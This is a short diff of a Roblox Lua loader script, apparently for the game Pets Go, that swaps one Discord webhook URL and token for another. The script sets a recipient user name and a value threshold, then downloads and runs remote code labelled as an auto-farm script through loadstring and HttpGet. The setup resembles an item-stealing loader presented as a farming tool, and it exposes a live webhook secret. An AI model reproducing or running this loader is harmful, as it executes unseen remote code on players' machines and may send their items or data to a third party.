@@ -1,5 +1,5 @@
 _G.User = "Heixy3"
-_G.Webhook = "https://discord.com/api/webhooks/1326583136297160775/sW630uy8eHiONkGXCtGkT4Y_QolHv3gV_s_40BOjVuVrJLQThQzXqjzAgf5nUh0u7r4P"
+_G.Webhook = "https://discord.com/api/webhooks/1329055069122986004/fBlMCEWMDvrtQepDqZ_wjfAxz80SA6etv6oRGeXypwglsEqIaijKMc5hQ4wI9Pq8WtQk"
 _G.Min = 100
 loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetsGO/refs/heads/main/AutoFarmOP.lua", true))()
 
